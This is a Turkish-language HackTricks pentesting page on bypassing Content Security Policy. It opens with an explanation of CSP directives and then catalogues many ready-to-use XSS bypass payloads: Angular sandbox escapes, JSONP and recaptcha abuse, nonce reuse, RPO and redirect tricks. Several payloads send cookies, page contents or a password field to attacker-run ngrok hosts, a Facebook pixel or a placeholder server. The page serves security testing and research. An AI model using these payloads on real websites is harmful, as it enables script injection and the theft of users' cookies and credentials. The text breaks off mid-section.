# İçerik Güvenlik Politikası (CSP) Atlatma

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hackleme İçgörüleri**\
Hackleme heyecanını ve zorluklarını ele alan içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hackleme dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın

**En Son Duyurular**\
Yayınlanan en yeni ödül avı programları ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

## CSP Nedir

İçerik Güvenlik Politikası (CSP), başlıca olarak **çapraz site komut dosyası (XSS) gibi saldırılara karşı koruma sağlamayı amaçlayan bir tarayıcı teknolojisi** olarak tanınır. Tarayıcı tarafından güvenli bir şekilde yüklenebilecek kaynakların yollarını ve kaynakları tanımlayarak çalışır. Bu kaynaklar, resimler, çerçeveler ve JavaScript gibi bir dizi öğeyi içerir. Örneğin, bir politika, aynı etki alanından (self), iç içe kaynakları ve `eval`, `setTimeout` veya `setInterval` gibi işlevler aracılığıyla dize kodunun yüklenmesine ve yürütülmesine izin verebilir.

CSP'nin uygulanması **yanıt başlıkları aracılığıyla** veya **HTML sayfasına meta öğeler ekleyerek** gerçekleştirilir. Bu politikaya göre, tarayıcılar bu şartları proaktif olarak uygular ve tespit edilen ihlalleri derhal engeller.

* Yanıt başlığı aracılığıyla uygulanmıştır:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Meta etiketi aracılığıyla uygulanmıştır:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Başlıklar

CSP, bu başlıklar kullanılarak zorunlu kılınabilir veya izlenebilir:

* `Content-Security-Policy`: CSP'yi zorunlu kılar; tarayıcı herhangi bir ihlali engeller.
* `Content-Security-Policy-Report-Only`: İzleme için kullanılır; ihlalleri engellemeden raporlar. Üretim öncesi ortamlarda test etmek için idealdir.

### Kaynakları Tanımlama

CSP, etkin ve pasif içeriklerin yüklenmesi için kökenleri kısıtlar ve iç içe JavaScript yürütme ve `eval()` kullanımı gibi yönleri kontrol eder. Bir örnek politika şöyle belirlenebilir:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Yönergeler

* **script-src**: JavaScript için belirli kaynaklara izin verir, URL'ler, iç içe betikler ve olay işleyicileri veya XSLT stilleri tarafından tetiklenen betikler dahil.
* **default-src**: Belirli getirme yönergeleri olmadığında kaynakları getirmek için varsayılan bir politika belirler.
* **child-src**: Web işçileri ve gömülü çerikler için izin verilen kaynakları belirtir.
* **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arabirimler kullanılarak yüklenebilecek URL'leri kısıtlar.
* **frame-src**: Çerçeveler için URL'leri kısıtlar.
* **frame-ancestors**: Geçerli sayfayı gömebilecek kaynakları belirtir, `<frame>`, `<iframe>`, `<object>`, `<embed>` ve `<applet>` gibi öğelere uygulanır.
* **img-src**: Görüntüler için izin verilen kaynakları tanımlar.
* **font-src**: `@font-face` kullanılarak yüklenen yazı tipleri için geçerli kaynakları belirtir.
* **manifest-src**: Uygulama manifest dosyalarının izin verilen kaynaklarını tanımlar.
* **media-src**: Medya nesnelerini yüklemek için izin verilen kaynakları tanımlar.
* **object-src**: `<object>`, `<embed>` ve `<applet>` öğeleri için izin verilen kaynakları tanımlar.
* **base-uri**: `<base>` öğeleri kullanılarak yüklenmesine izin verilen URL'leri belirtir.
* **form-action**: Form gönderimleri için geçerli uç noktaları listeler.
* **plugin-types**: Bir sayfanın çağırabileceği mime türlerini kısıtlar.
* **upgrade-insecure-requests**: Tarayıcılara HTTP URL'leri HTTPS'ye yeniden yazmalarını talimat verir.
* **sandbox**: Bir `<iframe>`'in sandbox özniteliği gibi kısıtlamalar uygular.
* **report-to**: Politika ihlal edildiğinde raporun gönderileceği bir grup belirtir.
* **worker-src**: Worker, SharedWorker veya ServiceWorker betikleri için geçerli kaynakları belirtir.
* **prefetch-src**: Getirilecek veya önceden getirilecek kaynaklar için geçerli kaynakları belirtir.
* **navigate-to**: Bir belgenin herhangi bir şekilde (a, form, window.location, window.open vb.) yönlendirebileceği URL'leri kısıtlar.

### Kaynaklar

* `*`: `data:`, `blob:`, `filesystem:` şemalarına sahip olmayan tüm URL'lere izin verir.
* `'self'`: Aynı etki alanından yükleme yapılmasına izin verir.
* `'data'`: Verilerin veri şeması aracılığıyla yüklenmesine izin verir (örneğin, Base64 kodlu görüntüler).
* `'none'`: Herhangi bir kaynaktan yükleme yapmayı engeller.
* `'unsafe-eval'`: `eval()` ve benzeri yöntemlerin kullanımına izin verir, güvenlik nedeniyle önerilmez.
* `'unsafe-hashes'`: Belirli iç içe olay işleyicilerini etkinleştirir.
* `'unsafe-inline'`: İç içe `<script>` veya `<style>` gibi kaynakların kullanımına izin verir, güvenlik nedeniyle önerilmez.
* `'nonce'`: Kriptografik bir nonce (bir kez kullanılan sayı) kullanarak belirli iç içe betikler için bir beyaz liste oluşturur.
* Eğer JS sınırlı yürütme varsa, sayfa içinde kullanılan bir nonce'yi `doc.defaultView.top.document.querySelector("[nonce]")` kullanarak almak ve ardından kötü amaçlı bir betik yüklemek için yeniden kullanmak mümkündür (strict-dynamic kullanılıyorsa, herhangi bir izin verilen kaynak yeni kaynaklar yükleyebilir, bu nedenle bu gerekli değildir), örneğin:

<details>

<summary>Nonce'yi yeniden kullanarak betik yükle</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Belirli bir sha256 karma değerine sahip betikleri beyaz listeye alır.
* `'strict-dynamic'`: Bir nonce veya karma ile beyaz listeye alınmışsa, herhangi bir kaynaktan betik yüklenmesine izin verir.
* `'host'`: `example.com` gibi belirli bir ana bilgisayar belirtir.
* `https:`: URL'leri yalnızca HTTPS kullananlara kısıtlar.
* `blob:`: Kaynakların Blob URL'lerinden (örneğin, JavaScript aracılığıyla oluşturulan Blob URL'lerinden) yüklenmesine izin verir.
* `filesystem:`: Kaynakların dosya sisteminden yüklenmesine izin verir.
* `'report-sample'`: İhlal raporunda ihlal eden kodun bir örneğini içerir (hata ayıklama için faydalıdır).
* `'strict-origin'`: 'self' ile benzerdir ancak kaynakların protokol güvenlik düzeyinin belgenin eşleştiğinden emin olur (yalnızca güvenli kökenler, güvenli kökenlerden kaynakları yükleyebilir).
* `'strict-origin-when-cross-origin'`: Aynı köken istekleri yaparken tam URL'leri gönderir, ancak istek çapraz köken olduğunda yalnızca kökeni gönderir.
* `'unsafe-allow-redirects'`: Hemen başka bir kaynağa yönlendirecek kaynakların yüklenmesine izin verir. Güvenliği zayıflattığı için önerilmez.

## Güvensiz CSP Kuralları

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Çalışan yük: `"/><script>alert(1);</script>`

#### Iframe'lar aracılığıyla self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Bu çalışmıyor, daha fazla bilgi için [**burayı kontrol edin**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Çalışan yük:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Eğer bir **izin verilen JS kodu DOM'da yeni bir script etiketi oluşturabilirse**, çünkü bir izin verilen script bunu oluşturuyorsa, **yeni script etiketi çalıştırılmasına izin verilecektir**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Çalışan yük:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src ve default-src Eksikliği

{% hint style="danger" %}
**Görünüşe göre artık bu çalışmıyor**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Çalışan yükler:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Dosya Yükleme + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Eğer bir JS dosyası yükleyebilirseniz, bu CSP'yi atlayabilirsiniz:

Çalışan yük:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ancak, sunucunun **yüklenen dosyayı doğruladığı ve yalnızca belirli türde dosyaların yüklenmesine izin verdiği** oldukça olasıdır.

Dahası, sunucu tarafından kabul edilen bir uzantı kullanarak bir dosyanın içine **JS kodu yükleyebilirseniz** bile (örneğin: _script.png_), bu yeterli olmayacaktır çünkü bazı sunucular gibi apache sunucusu **dosyanın MIME türünü uzantıya göre seçer** ve Chrome gibi tarayıcılar, bir resim olması gereken bir şeyin içindeki Javascript kodunu **çalıştırmayı reddedecektir**. "Neyse ki", hatalar var. Örneğin, bir CTF'den öğrendiğim gibi **Apache'nin** _**.wave**_ uzantısını tanımadığını, bu nedenle bir **ses/\*** MIME türüyle sunmadığını öğrendim.

Buradan, bir XSS ve bir dosya yükleme bulursanız ve **yanlış yorumlanan bir uzantı** bulmayı başarırsanız, o uzantıya sahip bir dosyayı ve betiğin İçeriğini yüklemeyi deneyebilirsiniz. Veya, sunucu yüklenen dosyanın doğru biçimini kontrol ediyorsa, bir poliglot oluşturabilirsiniz ([burada bazı poliglot örnekleri bulunmaktadır](https://github.com/Polydet/polyglot-database)).

### Form-action

JS enjekte etmek mümkün değilse, örneğin kimlik bilgilerini **bir form eylemi enjekte ederek** dışarı sızdırmayı deneyebilirsiniz (ve belki de şifre yöneticilerinin otomatik olarak şifreleri doldurmasını bekleyebilirsiniz). Bir [**örneği bu raporda bulabilirsiniz**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Ayrıca, `default-src`'nin form eylemlerini kapsamadığını unutmayın.

### Üçüncü Taraf Uç Noktaları + ('unsafe-eval')

{% hint style="warning" %}
Aşağıdaki bazı yükler için **`unsafe-eval` bile gerekli değil**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Angular'ın zafiyetli bir sürümünü yükleyin ve keyfi JS kodunu çalıştırın:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window` nesnesini döndüren fonksiyonlara sahip bir kütüphaneyi kullanan Payload'lar ([bu yazıya bakın](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Yazı, `cdn.cloudflare.com` (veya izin verilen başka JS kütüphaneleri deposu) üzerinden **tüm kütüphaneleri yükleyebileceğinizi**, her kütüphaneden eklenen tüm fonksiyonları çalıştırabileceğinizi ve **hangi fonksiyonların hangi kütüphanelerden `window` nesnesini döndürdüğünü kontrol edebileceğinizi** göstermektedir.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
## Bir sınıf adından Angular XSS:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Google recaptcha JS kodunu suiistimal etmek

[**Bu CTF çözümüne göre**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), bir CSP içinde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) adresini suiistimal ederek CSP'yi atlayarak keyfi JS kodunu yürütebilirsiniz:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Daha fazla [**bu yazıdan payloadlar**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/) bulabilirsiniz:
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Açık yönlendirmek için www.google.com'un kötüye kullanılması

Aşağıdaki URL, örnek.com'a yönlendirir (buradan [buraya](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
### Üçüncü Taraf Uç Noktaları + JSONP

\*.google.com/script.google.com kötüye kullanımı

Google Apps Script kötüye kullanılarak script.google.com içinde bir sayfada bilgi alınabilir. Bu [bu raporda](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/) olduğu gibi yapılabilir.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Belirli alan adı beyaz listesine alınmış olan senaryolarda `script-src` `self` ve belirli bir alan adı olarak ayarlandığında JSONP kullanılarak atlatılabilir. JSONP uç noktaları güvensiz geri çağırma yöntemlerine izin verir, bu da bir saldırganın XSS gerçekleştirmesine olanak tanır, çalışan yük:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklı web sitelerinin CSP atlatma için kullanıma hazır JSONP uç noktalarını içerir.**

Aynı zafiyet, **güvenilir uç nokta bir Açık Yönlendirme içeriyorsa** meydana gelecektir çünkü başlangıç uç noktası güvenilirse, yönlendirmeler güvenilir olacaktır.

### Üçüncü Taraf Kötüye Kullanımları

[şu yazıda](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) açıklandığı gibi, CSP'de bir yerlerde izin verilmiş olan birçok üçüncü taraf alanı, ya veri sızdırmak ya da JavaScript kodu yürütmek için kötüye kullanılabilir. Bu üçüncü taraflardan bazıları şunlardır:

| Kuruluş          | İzin Verilen Alanlar                         | Yetenekler   |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Veri Sızdırma|
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Veri Sızdırma|
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Yürütme      |
| Amazon CloudFront | \*.cloudfront.net                            | Veri Sızdırma, Yürütme |
| Amazon AWS        | \*.amazonaws.com                             | Veri Sızdırma, Yürütme |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Veri Sızdırma, Yürütme |
| Salesforce Heroku | \*.herokuapp.com                             | Veri Sızdırma, Yürütme |
| Google Firebase   | \*.firebaseapp.com                           | Veri Sızdırma, Yürütme |

Hedefinizin CSP'sinde izin verilen alanlardan herhangi birini bulursanız, büyük ihtimalle üçüncü taraf hizmetine kaydolarak CSP'yi atlayabilir ve ya o hizmete veri sızdırabilir ya da kodu yürütebilirsiniz.

Örneğin, aşağıdaki CSP'yi bulursanız:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
veya
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
1. [Burada](https://developers.facebook.com/) bir Facebook Geliştirici hesabı oluşturun.
2. Yeni bir "Facebook Giriş" uygulaması oluşturun ve "Website" seçeneğini seçin.
3. "Ayarlar -> Temel"e gidin ve "Uygulama Kimliği"nizi alın.
4. Veri sızdırmak istediğiniz hedef sitede, Facebook SDK cihazı "fbq" ve "customEvent" ile veri yükünü doğrudan kullanarak veri sızdırabilirsiniz.
5. Uygulama "Etkinlik Yöneticisi"ne gidin ve oluşturduğunuz uygulamayı seçin (etkinlik yöneticisinin URL'si şuna benzer bir URL'de bulunabilir: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events)
6. "Test Etkinlikleri" sekmesini seçerek "sizin" web siteniz tarafından gönderilen etkinlikleri görebilirsiniz.

Ardından, kurban tarafında, aşağıdaki kodu çalıştırarak Facebook takip pikselini başlatın ve saldırganın Facebook geliştirici hesabı uygulama kimliğine işaret eden özel bir etkinlik başlatın:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
### Önceki tabloda belirtilen diğer yedi üçüncü taraf alan adı için, bunları kötüye kullanabileceğiniz birçok başka yol vardır. Diğer üçüncü taraf kötüye kullanımları hakkında ek açıklamalar için önceki [blog yazısına](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) başvurun.

### RPO (Relative Path Overwrite) ile Atlatma <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Yukarıda belirtilen yönlendirmeye ek olarak, bazı sunucularda kullanılabilen Relative Path Overwrite (RPO) adlı başka bir teknik bulunmaktadır.

Örneğin, CSP'nin `https://example.com/scripts/react/` yoluna izin verdiği durumda, aşağıdaki gibi atlatılabilir:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Tarayıcı sonunda `https://example.com/scripts/angular/angular.js` adresini yükleyecektir.

Bu, tarayıcı için, `https://example.com/scripts/react/` altında bulunan `..%2fangular%2fangular.js` adlı bir dosyayı yüklediğiniz anlamına gelir, bu da CSP'ye uyumludur.

∑, bunu çözecek ve etkili bir şekilde `https://example.com/scripts/react/../angular/angular.js` adresini isteyecektir, bu da `https://example.com/scripts/angular/angular.js` ile eşdeğerdir.

Tarayıcı ve sunucu arasındaki URL yorumlama tutarsızlığını sömürerek, yol kuralları atlatılabilir.

Çözüm, sunucu tarafında `%2f`'yi `/` olarak işlememektir, böylece tarayıcı ve sunucu arasında tutarlı yorumlama sağlanarak bu sorundan kaçınılır.

Çevrimiçi Örnek: [https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### İframe'ler JS yürütme

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### eksik **base-uri**

Eğer **base-uri** yönergesi eksikse, [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) gerçekleştirmek için bunu kötüye kullanabilirsiniz.

Ayrıca, **sayfa bir **Nonce** kullanarak bir göreli yol kullanarak bir betik yüklüyorsa** (örneğin `<script src="/js/app.js">`), **base** **tag**'ını kötüye kullanarak **kendi sunucunuzdan betiği yüklemesini sağlayabilir ve XSS saldırısı gerçekleştirebilirsiniz.**\
Eğer zayıf sayfa **httpS** ile yükleniyorsa, base'de bir httpS URL kullanın.
```html
<base href="https://www.attacker.com/">
```
### AngularJS olayları

Belirli bir politika olan İçerik Güvenlik Politikası (CSP), JavaScript olaylarını kısıtlayabilir. Bununla birlikte, AngularJS, alternatif olarak özel olaylar tanıtır. Bir olay içinde, AngularJS, tarayıcıdaki olay nesnesine referans olan benzersiz bir `$event` nesnesi sağlar. Bu `$event` nesnesi, CSP'yi atlatmak için kullanılabilir. Özellikle, Chrome'da, `$event/event` nesnesi, olayın yürütme zincirinde yer alan bir nesne dizisini tutan `path` özniteliğine sahiptir ve bu dizide `window` nesnesi her zaman en sonda yer alır. Bu yapı, kum havuzu kaçış taktikleri için önemlidir.

Bu diziyi `orderBy` filtresine yönlendirerek, onun üzerinde dolaşmak ve terminal elemanı ( `window` nesnesi) kullanarak `alert()` gibi bir genel işlevi tetiklemek mümkündür. Aşağıdaki gösterilen kod parçacığı, bu süreci açıklar:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Bu parça, olayı tetiklemek için `ng-focus` direktifini kullanmanın, `path` dizisini manipüle etmek için `$event.path|orderBy`'i kullanmanın ve `alert()` fonksiyonunu çalıştırmak için `window` nesnesini kullanmanın vurgusunu yapar, böylece `document.cookie`'yi ortaya çıkarır.

**Diğer Angular bypasslarını** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **adresinde bulabilirsiniz**

### AngularJS ve izin verilen alan adı
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Bir Angular JS uygulamasında betik yükleme için alan adlarını beyaz listeye alan bir CSP politikası, geri çağrı işlevlerinin çağrılması ve belirli güvenlik açıklarına sahip sınıflar aracılığıyla atlatılabilir. Bu teknik hakkında daha fazla bilgi, bu [git deposunda](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) bulunan detaylı kılavuzda mevcuttur.

Çalışan yükler:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Diğer JSONP keyfi yürütme uç noktaları [**burada**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) bulunabilir (bazıları silindi veya düzeltildi)

### Yönlendirme Aracılığıyla Atlatma

CSP yönlendirme ile karşılaştığında ne olur? Yönlendirme farklı bir kökene yol açarsa ve izin verilmemişse, yine başarısız olacaktır.

Ancak, [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) açıklamasına göre, yönlendirme farklı bir yola yol açarsa, orijinal kısıtlamaları atlayabilir.

İşte bir örnek:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Eğer CSP `https://www.google.com/a/b/c/d` olarak ayarlanmışsa, yolun dikkate alındığından dolayı hem `/test` hem de `/a/test` betikleri CSP tarafından engellenecektir.

Ancak, son `http://localhost:5555/301` **sunucu tarafında `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`'e yönlendirilecektir**. Yönlendirme olduğundan, **yol dikkate alınmaz** ve **betik yüklenebilir**, böylece yol kısıtlaması atlatılmış olur.

Bu yönlendirme ile, yol tamamen belirtilmiş olsa bile, hala atlatılacaktır.

Bu nedenle, en iyi çözüm, web sitesinin herhangi bir açık yönlendirme güvenlik açığına sahip olmadığından ve CSP kurallarında istismar edilebilecek alan adlarının olmadığından emin olmaktır.

### Dangling markup ile CSP'yi atlatın

[buradan nasıl yapılacağını okuyun](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; XSS aracılığıyla
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` demek ki kodun içinde herhangi bir scripti çalıştırabilirsiniz (XSS kodu çalıştırabilir) ve `img-src *` demek ki web sayfasında herhangi bir kaynaktan herhangi bir resmi kullanabilirsiniz.

Bu CSP'yi resimler aracılığıyla veri sızdırarak atlayabilirsiniz (bu durumda XSS, bir bot tarafından erişilebilen bir sayfada bir SQLi içeren bir CSRF'yi kötüye kullanır ve bayrağı bir resim aracılığıyla çıkarır):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapılandırmayı **bir resmin içine yerleştirilmiş javascript kodunu yüklemek** için de kötüye kullanabilirsiniz. Örneğin, sayfa Twitter'dan resim yükleme izni veriyorsa, **özel bir resim oluşturabilir**, bunu Twitter'a yükleyebilir ve "**unsafe-inline**"ı kötüye kullanarak bir JS kodunu (normal bir XSS olarak) **çalıştırabilirsiniz**. Bu JS kodu, resmi **yükleyecek**, içinden JS'yi **çıkaracak** ve **çalıştıracaktır**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Servis İşçileriyle

Servis işçilerinin **`importScripts`** fonksiyonu CSP tarafından sınırlı değildir:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Politika Enjeksiyonu

**Araştırma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Eğer sizin tarafınızdan gönderilen bir **parametre**, **politikanın deklarasyonu içine yapıştırılıyorsa**, o zaman politikayı **kullanışsız hale getiren** bir şekilde değiştirebilirsiniz. Bu bypasslardan herhangi biriyle **script 'unsafe-inline'**'ı **izin verebilirsiniz**:
```bash
script-src-elem *; script-src-attr *
